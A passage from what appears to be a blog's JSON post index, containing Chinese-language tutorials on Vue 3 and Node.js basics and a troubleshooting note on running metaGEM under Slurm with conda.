123456import &#123; reactive &#125; from &#x27;vue&#x27;const counter = reactive(&#123; count: 0&#125;)console.log(counter.count) // 0counter.count++ reactive() 只适用于对象 (包括数组和内置类型，如 Map 和 Set)。而另一个 API ref() 则可以接受任何值类型。ref 会返回一个包裹对象，并在 .value 属性下暴露内部值。 1234import &#123; ref &#125; from &#x27;vue&#x27;const message = ref(&#x27;Hello World!&#x27;)console.log(message.value) // &quot;Hello World!&quot;message.value = &#x27;Changed&#x27; 3.Attribute绑定在 Vue 中，mustache 语法 (即双大括号) 只能用于文本插值。为了给 attribute 绑定一个动态值，需要使用 v-bind 指令： 1&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 其是由 v- 开头的一种特殊 attribute。它们是 Vue 模板语法的一部分。和文本插值类似，指令的值是可以访问组件状态的 JavaScript 表达式。 冒号后面的部分 (:id) 是指令的“参数”。此处，元素的 id attribute 将与组件状态里的 dynamicId 属性保持同步。 由于 v-bind 使用地非常频繁，它有一个专门的简写语法： 1&lt;div :id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 4.事件监听我们可以使用 v-on 指令监听 DOM 事件： 1&lt;button v-on:click=&quot;increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt; 因为其经常使用，v-on 也有一个简写语法： 1&lt;button @click=&quot;increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt; 此处，increment 引用了一个在 &lt;script setup&gt; 中声明的函数： 12345678&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const count = ref(0)function increment() &#123; // 更新组件状态 count.value++&#125;&lt;/script&gt; 在函数中，我们可以通过修改 ref 来更新组件状态。 5.表单绑定我们可以同时使用 v-bind 和 v-on 来在表单的输入元素上创建双向绑定： 1&lt;input :value=&quot;text&quot; @input=&quot;onInput&quot;&gt; 12345function onInput(e) &#123; // v-on 处理函数会接收原生 DOM 事件 // 作为其参数。 text.value = e.target.value&#125; 试着在文本框里输入——你会看到 &lt;p&gt; 里的文本也随着你的输入更新了。 为了简化双向绑定，Vue 提供了一个 v-model 指令，它实际上是上述操作的语法糖： 1&lt;input v-model=&quot;text&quot;&gt; v-model 会将被绑定的值与 &lt;input&gt; 的值自动同步，这样我们就不必再使用事件处理函数了。 6.条件渲染我们可以使用 v-if 指令来有条件地渲染元素： 1&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt; 这个 &lt;h1&gt; 标签只会在 awesome 的值为真值 (Truthy) 时渲染。若 awesome 更改为**假值 (Falsy)**，它将被从 DOM 中移除。 我们也可以使用 v-else 和 v-else-if 来表示其他的条件分支： 12&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt;&lt;h1 v-else&gt;Oh no 😢&lt;/h1&gt; 现在，示例程序同时展示了两个 &lt;h1&gt; 标签，并且按钮不执行任何操作。尝试给它们添加 v-if 和 v-else 指令，并实现 toggle() 方法，让我们可以使用按钮在它们之间切换。 7.列表渲染我们可以使用 v-for 指令来渲染一个基于源数组的列表： 12345&lt;ul&gt; &lt;li v-for=&quot;todo in todos&quot; :key=&quot;todo.id&quot;&gt; &#123;&#123; todo.text &#125;&#125; &lt;/li&gt;&lt;/ul&gt; 这里的 todo 是一个局部变量，表示当前正在迭代的数组元素。它只能在 v-for 所绑定的元素上或是其内部访问，就像函数的作用域一样。 注意，我们还给每个 todo 对象设置了唯一的 id，并且将它作为特殊的 [key attribute](https://cn.vuejs.org/api/built-in-special-attributes.html#key) 绑定到每个 &lt;li&gt;。key 使得 Vue 能够精确的移动每个 &lt;li&gt;，以匹配对应的对象在数组中的位置。 更新列表有两种方式： 在源数组上调用变更方法： 1todos.value.push(newTodo) 2.使用新的数组替代原数组： 1todos.value = todos.value.filter(/* ... */) 对以下函数进行解析 v-modle-&gt;:+@表单绑定 v-on-&gt;@事件监听 1234567891011121314151617181920212223242526272829303132&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;// 给每个 todo 对象一个唯一的 idlet id = 0const newTodo = ref(&#x27;&#x27;) //创建对象const todos = ref([ //创建数组 &#123; id: id++, text: &#x27;Learn HTML&#x27; &#125;, &#123; id: id++, text: &#x27;Learn JavaScript&#x27; &#125;, &#123; id: id++, text: &#x27;Learn Vue&#x27; &#125;])function addTodo() &#123;//添加函数 todos.value.push(&#123; id: id++, text: newTodo.value &#125;) newTodo.value = &#x27;&#x27;&#125;function removeTodo(todo) &#123;//移除函数//filter是JavaScript数组中自带的方法，当返回值为真是，返回；并且不改变原数组//()=&gt;是箭头函数，这是所用的形式是(param) =&gt; expression todos.value = todos.value.filter((t) =&gt; t !== todo)&#125;&lt;/script&gt;&lt;template&gt; &lt;form @submit.prevent=&quot;addTodo&quot;&gt;//对addTodo进行绑定，.prevent表示阻止表单的默认提交行为 &lt;input v-model=&quot;newTodo&quot;&gt; //绑定表单newTodo &lt;button&gt;Add Todo&lt;/button&gt; &lt;/form&gt; &lt;ul&gt; &lt;li v-for=&quot;todo in todos&quot; :key=&quot;todo.id&quot;&gt;//进行列表渲染 &#123;&#123; todo.text &#125;&#125; &lt;button @click=&quot;removeTodo(todo)&quot;&gt;X&lt;/button&gt;//清除动作 &lt;/li&gt; &lt;/ul&gt;&lt;/template&gt; 8.计算属性让我们在上一步的 todo 列表基础上继续。现在，我们已经给每一个 todo 添加了切换功能。这是通过给每一个 todo 对象添加 done 属性来实现的，并且使用了 v-model 将其绑定到复选框上： 1234&lt;li v-for=&quot;todo in todos&quot;&gt; &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;&gt; ...&lt;/li&gt; 下一个可以添加的改进是隐藏已经完成的 todo。我们已经有了一个能够切换 hideCompleted 状态的按钮。但是应该如何基于状态渲染不同的列表项呢？ 介绍一个新 API：**[computed()](https://cn.vuejs.org/guide/essentials/computed.html)**。它可以让我们创建一个计算属性 ref，这个 ref 会动态地根据其他响应式数据源来计算其 .value： 123456789101112131415161718192021222324252627282930313233343536373839&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;let id = 0const newTodo = ref(&#x27;&#x27;)const hideCompleted = ref(false)const todos = ref([ &#123; id: id++, text: &#x27;Learn HTML&#x27;, done: true &#125;, &#123; id: id++, text: &#x27;Learn JavaScript&#x27;, done: true &#125;, &#123; id: id++, text: &#x27;Learn Vue&#x27;, done: false &#125;])function addTodo() &#123; todos.value.push(&#123; id: id++, text: newTodo.value, done: false &#125;) newTodo.value = &#x27;&#x27;&#125;function removeTodo(todo) &#123; todos.value = todos.value.filter((t) =&gt; t !== todo)&#125;&lt;/script&gt;&lt;template&gt; &lt;form @submit.prevent=&quot;addTodo&quot;&gt; &lt;input v-model=&quot;newTodo&quot;&gt; &lt;button&gt;Add Todo&lt;/button&gt; &lt;/form&gt; &lt;ul&gt; &lt;li v-for=&quot;todo in todos&quot; :key=&quot;todo.id&quot;&gt; &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;&gt; &lt;span :class=&quot;&#123; done: todo.done &#125;&quot;&gt;&#123;&#123; todo.text &#125;&#125;&lt;/span&gt; &lt;button @click=&quot;removeTodo(todo)&quot;&gt;X&lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;button @click=&quot;hideCompleted = !hideCompleted&quot;&gt; &#123;&#123; hideCompleted ? &#x27;Show all&#x27; : &#x27;Hide completed&#x27; &#125;&#125; &lt;/button&gt;&lt;/template&gt;&lt;style&gt;.done &#123; text-decoration: line-through;&#125;&lt;/style&gt; 计算属性会自动跟踪其计算中所使用的到的其他响应式状态，并将它们收集为自己的依赖。计算结果会被缓存，并只有在其依赖发生改变时才会被自动更新。 9.生命周期和模板引用目前为止，Vue 为我们处理了所有的 DOM 更新，这要归功于响应性和声明式渲染。然而，有时我们也会不可避免地需要手动操作 DOM。 这时我们需要使用模板引用——也就是指向模板中一个 DOM 元素的 ref。我们需要通过这个特殊的 [ref](https://cn.vuejs.org/api/built-in-special-attributes.html#ref) attribute 来实现模板引用： 1&lt;p ref=&quot;pElementRef&quot;&gt;hello&lt;/p&gt; 要访问该引用，我们需要声明一个同名的 ref： 1const pElementRef = ref(null) 注意这个 ref 使用 null 值来初始化。这是因为当 &lt;script setup&gt; 执行时，DOM 元素还不存在。模板引用 ref 只能在组件挂载后访问。 要在挂载之后执行代码，我们可以使用 onMounted() 函数： 12345import &#123; onMounted &#125; from &#x27;vue&#x27;onMounted(() =&gt; &#123; // 此时组件已经挂载。&#125;) 这被称为生命周期钩子——它允许我们注册一个在组件的特定生命周期调用的回调函数。还有一些其他的钩子如 onUpdated 和 onUnmounted。 10侦听器有时我们需要响应性地执行一些“副作用”——例如，当一个数字改变时将其输出到控制台。我们可以通过侦听器来实现它： 12345678import &#123; ref, watch &#125; from &#x27;vue&#x27;const count = ref(0)watch(count, (newCount) =&gt; &#123; // 没错，console.log() 是一个副作用 console.log(`new count is: $&#123;newCount&#125;`)&#125;) watch() 可以直接侦听一个 ref，并且只要 count 的值改变就会触发回调。watch() 也可以侦听其他类型的数据源。 一个比在控制台输出更加实际的例子是当 ID 改变时抓取新的数据。在右边的例子中就是这样一个组件。该组件被挂载时，会从模拟 API 中抓取 todo 数据，同时还有一个按钮可以改变要抓取的 todo 的 ID。现在，尝试实现一个侦听器，使得组件能够在按钮被点击时抓取新的 todo 项目。 1234567891011121314151617181920212223&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const todoId = ref(1)const todoData = ref(null)async function fetchData() &#123; todoData.value = null const res = await fetch( `https://jsonplaceholder.typicode.com/todos/$&#123;todoId.value&#125;` ) todoData.value = await res.json()&#125;fetchData()&lt;/script&gt;&lt;template&gt; &lt;p&gt;Todo id: &#123;&#123; todoId &#125;&#125;&lt;/p&gt; &lt;button @click=&quot;todoId++&quot; :disabled=&quot;!todoData&quot;&gt;Fetch next todo&lt;/button&gt; &lt;p v-if=&quot;!todoData&quot;&gt;Loading...&lt;/p&gt; &lt;pre v-else&gt;&#123;&#123; todoData &#125;&#125;&lt;/pre&gt;&lt;/template&gt; 11组件目前为止，我们只使用了单个组件。真正的 Vue 应用往往是由嵌套组件创建的。 父组件可以在模板中渲染另一个组件作为子组件。要使用子组件，我们需要先导入它： 1import ChildComp from &#x27;./ChildComp.vue&#x27; 然后我们就可以在模板中使用组件，就像这样： 1&lt;ChildComp /&gt; 12 Props子组件可以通过 props 从父组件接受动态数据。首先，需要声明它所接受的 props： 123456&lt;!-- ChildComp.vue --&gt;&lt;script setup&gt;const props = defineProps(&#123; msg: String&#125;)&lt;/script&gt; 注意 defineProps() 是一个编译时宏，并不需要导入。一旦声明，msg prop 就可以在子组件的模板中使用。它也可以通过 defineProps() 所返回的对象在 JavaScript 中访问。 父组件可以像声明 HTML attributes 一样传递 props。若要传递动态值，也可以使用 v-bind 语法： 1&lt;ChildComp :msg=&quot;greeting&quot; /&gt; 12345678910&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;import ChildComp from &#x27;./ChildComp.vue&#x27;const greeting = ref(&#x27;Hello from parent&#x27;)&lt;/script&gt;&lt;template&gt; &lt;ChildComp :msg=&quot;greeting&quot; /&gt;&lt;/template&gt; 13 Emits除了接收 props，子组件还可以向父组件触发事件： 1234567&lt;script setup&gt;// 声明触发的事件const emit = defineEmits([&#x27;response&#x27;])// 带参数触发emit(&#x27;response&#x27;, &#x27;hello from child&#x27;)&lt;/script&gt; emit() 的第一个参数是事件的名称。其他所有参数都将传递给事件监听器。 父组件可以使用 v-on 监听子组件触发的事件——这里的处理函数接收了子组件触发事件时的额外参数并将它赋值给了本地状态： 1&lt;ChildComp @response=&quot;(msg) =&gt; childMsg = msg&quot; /&gt; 1234567891011&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;import ChildComp from &#x27;./ChildComp.vue&#x27;const childMsg = ref(&#x27;No child msg yet&#x27;)&lt;/script&gt;&lt;template&gt; &lt;ChildComp @response=&quot;(msg) =&gt; childMsg = msg&quot; /&gt; &lt;p&gt;&#123;&#123; childMsg &#125;&#125;&lt;/p&gt;&lt;/template&gt; 14 插槽除了通过 props 传递数据外，父组件还可以通过插槽 (slots) 将模板片段传递给子组件： 123&lt;ChildComp&gt; This is some slot content!&lt;/ChildComp&gt; 在子组件中，可以使用 &lt;slot&gt; 元素作为插槽出口 (slot outlet) 渲染父组件中的插槽内容 (slot content)： 12&lt;!-- 在子组件的模板中 --&gt;&lt;slot/&gt; &lt;slot&gt; 插口中的内容将被当作“默认”内容：它会在父组件没有传递任何插槽内容时显示： 1&lt;slot&gt;Fallback content&lt;/slot&gt; 现在我们没有给 &lt;ChildComp&gt; 传递任何插槽内容，所以你将看到默认内容。让我们利用父组件的 msg 状态为子组件提供一些插槽内容吧。","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://snowman12137.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"前端学习,VUE","slug":"前端学习-VUE","permalink":"https://snowman12137.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0-VUE/"}],"author":"Sn0wma1n"},{"title":"metaGEM使用小记(解决各种问题)2024.1(二)","slug":"metaGEM使用小记-解决各种问题-2024-2（二）-daf9e5675b4d49cc855dd652b38a99e5","date":"2024-02-01T16:00:00.000Z","updated":"2024-03-02T14:18:13.816Z","comments":true,"path":"2024/02/02/metaGEM使用小记-解决各种问题-2024-2（二）-daf9e5675b4d49cc855dd652b38a99e5/","link":"","permalink":"https://snowman12137.github.io/2024/02/02/metaGEM%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0-%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98-2024-2%EF%BC%88%E4%BA%8C%EF%BC%89-daf9e5675b4d49cc855dd652b38a99e5/","excerpt":"","text":"metaGEM使用小记(解决各种问题)2024.2(二)书接上文，貌似配置还有点问题。跑了半天以后迟迟看不到结果，htop一看CPU占用几乎为0，应该是没跑起来，squeue 再一看，状态是PD，意思是等待，正常情况应该是R。于是我有网上找了下原因，说只有空闲条件满足job的运行条件才会运行。 我做了以下操作： 先scancle 掉所有队列里的人物 修改slurm.config 的参数稍大一些 重新启动sudo systemctl restart slurmd &amp; sudo systemctl restart slurmctld 更改bash metaGEM.sh -t fastp -j 2 -c 2 -m 10 -h 2 中m(内存)的大小和j(任务数量)的大小 运行报错 12sbatch: error: Memory specification can not be satisfiedsbatch: error: Batch job submission failed: Requested node configuration is not available 再排查一下scontrol show nodes 我们熟悉的报错又回来了（状态又是drain） 查了好久好久在sudo cat /var/log/slurm-llnl/slurmctld.log 里面找到了错误 就是NodeName那一行的配置Sockets和CoresPerSocket不仅要小于上一章讲的bash cxc.sh 的文件中的值，还要小于日志文件中数字前面的值，如(20&lt;SocketsCoresPerSocket) 那么SocketsCoresPerSocket的积要小于20才可以。 如果日志长这样那么八成就可以启动了 然后我们输入，改变节点的状态成空闲(注意一定要是sudo权限) 1sudo scontrol update NodeName=your_node_name State=idle 1.问题:成功运行程序但是瞬间完成，并无输出结果排查！ 在/var/log/slurm-llnl/slurmctld.log 里面显示 123[2024-01-29T15:37:19.292] sched: Allocate JobId=73 NodeList=your_computer #CPUs=8 Partition=your_computer[2024-01-29T15:37:20.367] _job_complete: JobId=73 WEXITSTATUS 1[2024-01-29T15:37:20.367] _job_complete: JobId=73 done 再排查/var/log/slurm-llnl/slurmd.log 无法创建输出文件 这属于slurm的BUG之一，只能先创建文件然后再创建文件夹 所以我们是能手动mkdir log 然后再运行 2.运行时日志文件中报错&#x2F;usr&#x2F;bin&#x2F;bash: line 2: activate: No such file or directory 猜测是这里面envs/metagem 的工作路径有变化，所以我们改成绝对路径试一下 1set +u;source activate envs/metagem;set -u; 如何更改，提交给slurm处理的脚本是由snakemake生成的，因此我们找到这一句 1source activate &#123;config[envs][metagem]&#125; 发现读取的config是config.ymal文件 应该在config.yaml文件里改这里，改成绝对路径 原来不是这个问题（服了） 当使用source activate env_name时，设置conda路径到环境变量即可 1export PATH=&quot;/home/gc/anaconda3/bin:$PATH&quot; 另外再shell脚本中启用conda环境一定要使用source不能使用conda。 成功运行（泪目）！！！ 成功运行（泪目）！！ 成功运行（泪目）！ 成功运行（泪目 成功运行（泪 成功运行（ 成功运行 成功运 成功 成","categories":[{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"}],"tags":[{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"}],"author":"Sn0wma1n"},{"title":"Node.js学习（二）","slug":"Node-js学习（二）","date":"2024-01-31T16:00:00.000Z","updated":"2024-03-02T14:17:20.639Z","comments":true,"path":"2024/02/01/Node-js学习（二）/","link":"","permalink":"https://snowman12137.github.io/2024/02/01/Node-js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"Node.js学习（二）1.文件系统Node.js 提供一组类似 UNIX（POSIX）标准的文件操作API。 Node 导入文件系统模块(fs)语法如下所示： 1var fs = require(&quot;fs&quot;) a.异步和同步Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync()。 异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。 建议大家使用异步方法，比起同步，异步方法性能更高，速度更快，而且没有阻塞。 input.txt文件内容如下: 12菜鸟教程官网地址：www.runoob.com文件读取实例 file.js 123456789101112var fs = require(&quot;fs&quot;);// 异步读取fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;异步读取: &quot; + data.toString());&#125;);// 同步读取var data = fs.readFileSync(&#x27;input.txt&#x27;);console.log(&quot;同步读取: &quot; + data.toString());console.log(&quot;程序执行完毕。&quot;); 1234567$ node file.js 同步读取: 菜鸟教程官网地址：www.runoob.com文件读取实例程序执行完毕。异步读取: 菜鸟教程官网地址：www.runoob.com文件读取实例 b.打开文件以下为在异步模式下打开文件的语法格式： 1fs.open(path, flags[, mode], callback) 参数使用说明如下： path - 文件的路径。 flags - 文件打开的行为。具体值详见下文。 mode - 设置文件模式(权限)，文件创建默认权限为 0666(可读，可写)。 callback - 回调函数，带有两个参数如：callback(err, fd)。 12345678910var fs = require(&quot;fs&quot;);// 异步打开文件console.log(&quot;准备打开文件！&quot;);fs.open(&#x27;input.txt&#x27;, &#x27;r+&#x27;, function(err, fd) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;文件打开成功！&quot;); &#125;); 2.GET&#x2F;POST请求a.获取GET请求内容由于GET请求直接被嵌入在路径中，URL是完整的请求路径，包括了?后面的部分，因此你可以手动解析后面的内容作为GET请求的参数。 node.js 中 url 模块中的 parse 函数提供了这个功能。 12345678var http = require(&#x27;http&#x27;);var url = require(&#x27;url&#x27;);var util = require(&#x27;util&#x27;); http.createServer(function(req, res)&#123; res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain; charset=utf-8&#x27;&#125;); res.end(util.inspect(url.parse(req.url, true)));&#125;).listen(3000); 浏览器中访问http://localhost:3000/user?name=Sn0wm1an&amp;url=xiaowublog.top b.获取URL参数我们可以使用 url.parse 方法来解析 URL 中的参数，代码如下： 1234567891011121314var http = require(&#x27;http&#x27;);var url = require(&#x27;url&#x27;);var util = require(&#x27;util&#x27;); http.createServer(function(req, res)&#123; res.setHeader(&#x27;Content-Type&#x27;,&#x27;text/html; charset=utf-8&#x27;); // 解析 url 参数 var params = url.parse(req.url, true).query; res.write(&quot;网站名：&quot; + params.name); res.write(&quot;\\n&quot;); res.write(&quot;网站 URL：&quot; + params.url); res.end(); &#125;).listen(3000); c.获取 POST 请求内容POST 请求的内容全部的都在请求体中，http.ServerRequest 并没有一个属性内容为请求体，原因是等待请求体传输可能是一件耗时的工作。 比如上传文件，而很多时候我们可能并不需要理会请求体的内容，恶意的POST请求会大大消耗服务器的资源，所以 node.js 默认是不会解析请求体的，当你需要的时候，需要手动来做。 12345678910111213141516var http = require(&#x27;http&#x27;);var querystring = require(&#x27;querystring&#x27;);var util = require(&#x27;util&#x27;);http.createServer(function(req, res)&#123; // 定义了一个post变量，用于暂存请求体的信息 var post = &#x27;&#x27;; // 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中 req.on(&#x27;data&#x27;, function(chunk)&#123; post += chunk; &#125;); // 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。 req.on(&#x27;end&#x27;, function()&#123; post = querystring.parse(post); res.end(util.inspect(post)); &#125;);&#125;).listen(3000); 以下实例表单通过 POST 提交并输出数据： 12345678910111213141516171819202122232425262728293031323334var http = require(&#x27;http&#x27;);var querystring = require(&#x27;querystring&#x27;); var postHTML = &#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程 Node.js 实例&lt;/title&gt;&lt;/head&gt;&#x27; + &#x27;&lt;body&gt;&#x27; + &#x27;&lt;form method=&quot;post&quot;&gt;&#x27; + &#x27;网站名： &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27; + &#x27;网站 URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27; + &#x27;&lt;input type=&quot;submit&quot;&gt;&#x27; + &#x27;&lt;/form&gt;&#x27; + &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;; http.createServer(function (req, res) &#123; var body = &quot;&quot;; req.on(&#x27;data&#x27;, function (chunk) &#123; body += chunk; &#125;); req.on(&#x27;end&#x27;, function () &#123; // 解析参数 body = querystring.parse(body); // 设置响应头部信息及编码 res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=utf8&#x27;&#125;); if(body.name &amp;&amp; body.url) &#123; // 输出提交的数据 res.write(&quot;网站名：&quot; + body.name); res.write(&quot;&lt;br&gt;&quot;); res.write(&quot;网站 URL：&quot; + body.url); &#125; else &#123; // 输出表单 res.write(postHTML); &#125; res.end(); &#125;);&#125;).listen(3000);","categories":[{"name":"Electron-Vue-WebRTC客户端学习","slug":"Electron-Vue-WebRTC客户端学习","permalink":"https://snowman12137.github.io/categories/Electron-Vue-WebRTC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Nodejs学习","slug":"Nodejs学习","permalink":"https://snowman12137.github.io/tags/Nodejs%E5%AD%A6%E4%B9%A0/"}],"author":"Sn0wma1n"},{"title":"Node.js学习（一）","slug":"Node-js学习（一）","date":"2024-01-29T16:00:00.000Z","updated":"2024-03-02T14:17:05.651Z","comments":true,"path":"2024/01/30/Node-js学习（一）/","link":"","permalink":"https://snowman12137.github.io/2024/01/30/Node-js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"Node.js学习（一）1.Node.js的异步在了解Node.js异步之前，我们先看一看其前身JavaScript的异步编程技巧。 一个异步过程的执行将不再与原有的序列有顺序关系。简单来理解就是：同步按你的代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。 什么时候用异步编程 在前端编程中（甚至后端有时也是这样），我们在处理一些简短、快速的操作时，例如计算 1 + 1 的结果，往往在主线程中就可以完成。主线程作为一个线程，不能够同时接受多方面的请求。所以，当一个事件没有结束时，界面将无法处理其他请求。 现在有一个按钮，如果我们设置它的 onclick 事件为一个死循环，那么当这个按钮按下，整个网页将失去响应。 为了避免这种情况的发生，我们常常用子线程来完成一些可能消耗时间足够长以至于被用户察觉的事情，比如读取一个大文件或者发出一个网络请求。因为子线程独立于主线程，所以即使出现阻塞也不会影响主线程的运行。但是子线程有一个局限：一旦发射了以后就会与主线程失去同步，我们无法确定它的结束，如果结束之后需要处理一些事情，比如处理来自服务器的信息，我们是无法将它合并到主线程中去的。 为了解决这个问题，JavaScript 中的异步操作函数往往通过回调函数来实现异步任务的结果处理。 a.JavaSript回调函数回调函数就是一个函数，它是在我们启动一个异步任务的时候就告诉它：等你完成了这个任务之后要干什么。这样一来主线程几乎不用关心异步任务的状态了，他自己会善始善终。 1234function print() &#123; document.getElementById(&quot;demo&quot;).innerHTML=&quot;RUNOOB!&quot;;&#125;setTimeout(print, 3000); 这段程序中的 setTimeout 就是一个消耗时间较长（3 秒）的过程，它的第一个参数是个回调函数，第二个参数是毫秒数，这个函数执行之后会产生一个子线程，子线程会等待 3 秒，然后执行回调函数 “print”，在命令行输出 “RUNOOB!”。 而且我们可以不声明函数，用匿名函数放到方法里。 123setTimeout(function () &#123; document.getElementById(&quot;demo&quot;).innerHTML=&quot;RUNOOB!&quot;;&#125;, 3000); b.Nodejs回调函数创建阻塞代码main.js 123456var fs = require(&quot;fs&quot;);var data = fs.readFileSync(&#x27;input.txt&#x27;);console.log(data.toString());console.log(&quot;程序执行结束!&quot;); 非阻塞式代码是将方法中最后一位插入回调函数，形式如下 12345678var fs = require(&quot;fs&quot;);fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) return console.error(err); console.log(data.toString());&#125;);console.log(&quot;程序执行结束!&quot;); 2.事件循环a.事件驱动程序，NodeJS使用的是事件驱动模型，当web server接收到请求，就把它关闭然后进行处理，然后去服务下一个web请求。 当这个请求完成，它被放回处理队列，当到达队列开头，这个结果被返回给用户。 这个模型非常高效可扩展性非常强，因为 webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO） (图来源菜鸟) 整个事件驱动的流程就是这么实现的，非常简洁。有点类似于观察者模式，事件相当于一个主题(Subject)，而所有注册到这个事件上的处理函数相当于观察者(Observer)。 123456789// 引入 events 模块var events = require(&#x27;events&#x27;);// 创建 eventEmitter 对象var eventEmitter = new events.EventEmitter();// 绑定事件及事件的处理程序//eventHandler是绑定的函数eventEmitter.on(&#x27;eventName&#x27;, eventHandler);// 触发事件eventEmitter.emit(&#x27;eventName&#x27;); 例子 12345678910111213141516171819202122232425// 引入 events 模块var events = require(&#x27;events&#x27;);// 创建 eventEmitter 对象var eventEmitter = new events.EventEmitter(); // 创建事件处理程序var connectHandler = function connected() &#123; console.log(&#x27;连接成功。&#x27;); // 触发 data_received 事件 eventEmitter.emit(&#x27;data_received&#x27;);&#125; // 绑定 connection 事件处理程序eventEmitter.on(&#x27;connection&#x27;, connectHandler); // 使用匿名函数绑定 data_received 事件eventEmitter.on(&#x27;data_received&#x27;, function()&#123; console.log(&#x27;数据接收成功。&#x27;);&#125;); // 触发 connection 事件 eventEmitter.emit(&#x27;connection&#x27;); console.log(&quot;程序执行完毕。&quot;); b.EventEmitter类Node.js 所有的异步 I&#x2F;O 操作在完成时都会发送一个事件到事件队列。 Node.js 里面的许多对象都会分发事件：一个 net.Server 对象会在每次有新连接时触发一个事件， 一个 fs.readStream 对象会在文件被打开的时候触发一个事件。 所有这些产生事件的对象都是 events.EventEmitter 的实例。 EventEmitter 对象如果在实例化时发生错误，会触发 error 事件。当添加新的监听器时，newListener 事件会触发，当监听器被移除时，removeListener 事件被触发。 下面我们用一个简单的例子说明 EventEmitter 的用法： 123456789//event.js 文件var EventEmitter = require(&#x27;events&#x27;).EventEmitter; var event = new EventEmitter(); event.on(&#x27;some_event&#x27;, function() &#123; //绑定触发语句 console.log(&#x27;some_event 事件触发&#x27;); &#125;); setTimeout(function() &#123; event.emit(&#x27;some_event&#x27;); //触发&#125;, 1000); 可以绑定多个触发语句 12345678910//event.js 文件var events = require(&#x27;events&#x27;); var emitter = new events.EventEmitter(); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener1&#x27;, arg1, arg2); &#125;); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener2&#x27;, arg1, arg2); &#125;); emitter.emit(&#x27;someEvent&#x27;, &#x27;arg1 参数&#x27;, &#x27;arg2 参数&#x27;); 3.Buffer与Streama.BufferJavaScript 语言自身只有字符串数据类型，没有二进制数据类型。 但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。 字符编码 Buffer 实例一般用于表示编码字符的序列，比如 UTF-8 、 UCS2 、 Base64 、或十六进制编码的数据。 通过使用显式的字符编码，就可以在 Buffer 实例与普通的 JavaScript 字符串之间进行相互转换。 12345const buf = Buffer.from(&#x27;runoob&#x27;, &#x27;ascii&#x27;);// 输出 72756e6f6f62console.log(buf.toString(&#x27;hex&#x27;));// 输出 cnVub29iconsole.log(buf.toString(&#x27;base64&#x27;)); 读写数据 12buf.write(string[, offset[, length]][, encoding])buf.toString([encoding[, start[, end]]]) 转换成JSON对象 当字符串化一个 Buffer 实例时，JSON.stringify()会隐式地调用该 **toJSON()**。 返回JSON对象 1buf.toJSON() 例子 1234567891011121314const buf = Buffer.from([0x1, 0x2, 0x3, 0x4, 0x5]);const json = JSON.stringify(buf);// 输出: &#123;&quot;type&quot;:&quot;Buffer&quot;,&quot;data&quot;:[1,2,3,4,5]&#125;console.log(json);const copy = JSON.parse(json, (key, value) =&gt; &#123; return value &amp;&amp; value.type === &#x27;Buffer&#x27; ? Buffer.from(value.data) : value;&#125;);// 输出: &lt;Buffer 01 02 03 04 05&gt;console.log(copy); 输出为 